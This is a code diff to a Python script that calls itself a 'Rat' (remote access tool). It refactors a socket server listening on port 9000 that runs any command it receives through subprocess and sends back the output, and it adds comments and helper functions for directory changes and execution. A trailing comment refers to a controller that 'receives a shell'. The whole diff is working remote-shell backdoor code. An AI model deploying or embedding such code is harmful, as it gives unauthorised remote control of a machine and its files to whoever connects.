@@ -16,7 +16,7 @@ import sys
 sel = selectors.DefaultSelector()
 
 
-# Rat socket, listens on port and waits for a connection.
+# Rat socket, listens on port and waits for a connection. When connection comes in then execute accept_connection
 def remote_sock():
     address = '127.0.0.1'
     port = 9000
@@ -29,29 +29,23 @@ def remote_sock():
     rat_socket.setblocking(False)
     sel.register(rat_socket, selectors.EVENT_READ, accept_connection)
 
-
+# Accept connection, register conn with selector for read events, execute remote_shell when conn sends message
 def accept_connection(rat_socket):
     conn, addr = rat_socket.accept()
     print('Connected', addr)
     conn.setblocking(False)
     sel.register(conn, selectors.EVENT_READ, remote_shell)
 
-
+# Receive our message from client, if or else, execute the functions listed.
 def remote_shell(conn):
     try:
         rmsg = conn.recv(1024)
         if rmsg:
             commands = shlex.split(rmsg.decode())
             if commands[0] == 'cd':
-                os.chdir(commands[1])
-                new_dir = os.getcwd()
-                conn.send(new_dir.encode())
+                change_dir(commands, conn)
             else:
-                execution = subprocess.run(commands, capture_output=True)
-                if execution.stdout:
-                    conn.send(execution.stdout)
-                else:
-                    conn.send(b'error')
+                execute(commands, conn)
         else:
             print('Client disconnected')
             sel.unregister(conn)
@@ -60,6 +54,22 @@ def remote_shell(conn):
         print('Error', e)
         sel.unregister(conn)
         conn.close()
+
+
+# Called by remote_shell function when the command is 'cd'. Changes directory and then sends new directory.
+def change_dir(commands, conn):
+    os.chdir(commands[1])
+    new_dir = os.getcwd()
+    conn.send(new_dir.encode())
+
+
+# Called by remote shell, executes the command sent and sends stdout or stderror.
+def execute(commands, conn):
+    execution = subprocess.run(commands, capture_output=True)
+    if execution.stdout:
+        conn.send(execution.stdout)
+    else:
+        conn.send(execution.stderr)
 
 
 # Controller socket, connects to rat socket and receives a shell.
